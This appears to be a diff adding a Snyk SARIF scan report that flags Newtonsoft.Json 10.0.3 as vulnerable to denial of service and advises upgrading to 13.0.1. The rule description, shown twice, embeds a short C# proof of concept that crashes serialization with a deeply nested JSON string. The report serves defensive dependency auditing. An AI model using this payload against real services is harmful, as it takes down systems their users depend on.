@@ -1,0 +1,86 @@
+{
+  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0-rtm.5.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "results": [
+        {
+          "ruleId": "SNYK-DOTNET-NEWTONSOFTJSON-2774678",
+          "level": "error",
+          "message": {
+            "text": "This file introduces a vulnerable Newtonsoft.Json package with a high severity vulnerability."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "src/Common/packages.config",
+                  "index": 0
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "0": "8ea1e915fad81b081b2a960f83b28f71708dd67b03e724224a4e9fbc1bb72773"
+          },
+          "rank": 7.5,
+          "properties": {
+            "packageManager": "nuget",
+            "packageName": "Newtonsoft.Json",
+            "packageVersion": "10.0.3",
+            "cvss3BaseScore": "7.5",
+            "cvss3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P",
+            "vulnPublicationDate": "2022-04-24T10:58:25Z",
+            "semanticVersion": ["[,13.0.1)"],
+            "patchedVersion": ["13.0.1"],
+            "cve": [],
+            "cwe": ["CWE-755"],
+            "xref": ["GHSA-5crp-9r3c-p9vr"]
+          }
+        }
+      ],
+      "tool": {
+        "driver": {
+          "name": "SnykOpenSource",
+          "fullName": "SnykOpenSource",
+          "version": "1.0.0",
+          "semanticVersion": "1.0.0",
+          "informationUri": "https://docs.snyk.io/products/snyk-open-source",
+          "rules": [
+            {
+              "id": "SNYK-DOTNET-NEWTONSOFTJSON-2774678",
+              "name": "Newtonsoft.Json@10.0.3",
+              "fullDescription": {
+                "text": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Defaults due to improper handling of StackOverFlow exception (SOE) whenever nested expressions are being processed. Exploiting this vulnerability results in Denial Of Service (DoS), and it is exploitable when an attacker sends 5 requests that cause SOE in time frame of 5 minutes.\r\n\r\n**Note:**\r\nThis vulnerability is only applicable to systems deployed on IIS (Internet Information Services) web-server\r\n\r\n## PoC:\r\n\r\n```js\r\n\r\nusing System;\r\n\r\nusing System.IO;\r\n\r\nusing System.Linq;\r\n\r\nusing Newtonsoft.Json;\r\n\r\nusing Newtonsoft.Json.Linq;\r\n\r\n\r\nnamespace JsonTests\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            //Create a string representation of an highly nested object (JSON serialized)\r\n            int nRep = 24000;\r\n            string json = string.Concat(Enumerable.Repeat(\"{a:\", nRep)) + \"1\" +\r\n                          string.Concat(Enumerable.Repeat(\"}\", nRep));\r\n\r\n            //Parse this object (Parsing works well - no exception is being thrown)\r\n            var parsedJson = JObject.Parse(json);\r\n            \r\n            using (var ms = new MemoryStream())\r\n            using (var sWriter = new StreamWriter(ms))\r\n            using (var jWriter = new JsonTextWriter(sWriter))\r\n            {\r\n                //Trying to serialize the object will result in StackOverflowException !!!\r\n                parsedJson.WriteTo(jWriter);\r\n            }\r\n\r\n            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)\r\n            //parsedJson.ToString();\r\n\r\n            //JsonConvert.SerializeObject throws StackOverflowException as well\r\n            //string a = JsonConvert.SerializeObject(parsedJson);\r\n\r\n        }\r\n    }\r\n}\r\n\r\n```\n## Remediation\nUpgrade `Newtonsoft.Json` to version 13.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)\n- [GitHub Issue](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)\n- [GitHub PR](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)\n- [Security Advisory](https://alephsecurity.com/vulns/aleph-2018004)\n- [Security Article](https://alephsecurity.com/2018/10/22/StackOverflowException/)\n",
+                "markdown": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Defaults due to improper handling of StackOverFlow exception (SOE) whenever nested expressions are being processed. Exploiting this vulnerability results in Denial Of Service (DoS), and it is exploitable when an attacker sends 5 requests that cause SOE in time frame of 5 minutes.\r\n\r\n**Note:**\r\nThis vulnerability is only applicable to systems deployed on IIS (Internet Information Services) web-server\r\n\r\n## PoC:\r\n\r\n```js\r\n\r\nusing System;\r\n\r\nusing System.IO;\r\n\r\nusing System.Linq;\r\n\r\nusing Newtonsoft.Json;\r\n\r\nusing Newtonsoft.Json.Linq;\r\n\r\n\r\nnamespace JsonTests\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            //Create a string representation of an highly nested object (JSON serialized)\r\n            int nRep = 24000;\r\n            string json = string.Concat(Enumerable.Repeat(\"{a:\", nRep)) + \"1\" +\r\n                          string.Concat(Enumerable.Repeat(\"}\", nRep));\r\n\r\n            //Parse this object (Parsing works well - no exception is being thrown)\r\n            var parsedJson = JObject.Parse(json);\r\n            \r\n            using (var ms = new MemoryStream())\r\n            using (var sWriter = new StreamWriter(ms))\r\n            using (var jWriter = new JsonTextWriter(sWriter))\r\n            {\r\n                //Trying to serialize the object will result in StackOverflowException !!!\r\n                parsedJson.WriteTo(jWriter);\r\n            }\r\n\r\n            //ToString throws StackOverflowException as well  (ToString is very unefficient - even for smaller payloads, it will occupy a lot of CPU & Memory)\r\n            //parsedJson.ToString();\r\n\r\n            //JsonConvert.SerializeObject throws StackOverflowException as well\r\n            //string a = JsonConvert.SerializeObject(parsedJson);\r\n\r\n        }\r\n    }\r\n}\r\n\r\n```\n## Remediation\nUpgrade `Newtonsoft.Json` to version 13.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66)\n- [GitHub Issue](https://github.com/JamesNK/Newtonsoft.Json/issues/2457)\n- [GitHub PR](https://github.com/JamesNK/Newtonsoft.Json/pull/2462)\n- [Security Advisory](https://alephsecurity.com/vulns/aleph-2018004)\n- [Security Article](https://alephsecurity.com/2018/10/22/StackOverflowException/)\n"
+              },
+              "help": {
+                "text": "References:\nGitHub Commit: https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66\nGitHub Issue: https://github.com/JamesNK/Newtonsoft.Json/issues/2457\nGitHub PR: https://github.com/JamesNK/Newtonsoft.Json/pull/2462\nSecurity Advisory: https://alephsecurity.com/vulns/aleph-2018004\nSecurity Article: https://alephsecurity.com/2018/10/22/StackOverflowException/\n\nTriage Advice:\nThis vulnerability is only applicable on systems deployed on IIS (Internet Information Services) web-server",
+                "markdown": "References:\nGitHub Commit: https://github.com/JamesNK/Newtonsoft.Json/commit/7e77bbe1beccceac4fc7b174b53abfefac278b66\nGitHub Issue: https://github.com/JamesNK/Newtonsoft.Json/issues/2457\nGitHub PR: https://github.com/JamesNK/Newtonsoft.Json/pull/2462\nSecurity Advisory: https://alephsecurity.com/vulns/aleph-2018004\nSecurity Article: https://alephsecurity.com/2018/10/22/StackOverflowException/\n\nTriage Advice:\nThis vulnerability is only applicable on systems deployed on IIS (Internet Information Services) web-server"
+              },
+              "shortDescription": {
+                "text": "Insecure Defaults in Newtonsoft.Json@10.0.3",
+                "markdown": "Insecure Defaults in Newtonsoft.Json@10.0.3"
+              },
+              "properties": {
+                "security-severity": 7.5,
+                "tags": ["security","nuget","CWE-755"]
+              }
+            }
+          ]
+        }
+      },
+      "artifacts": [
+        {
+          "location": {
+            "uri": "src/Common/packages.config"
+          }
+        }
+      ],
+      "columnKind": "utf16CodeUnits"
+    }
+  ]
+}
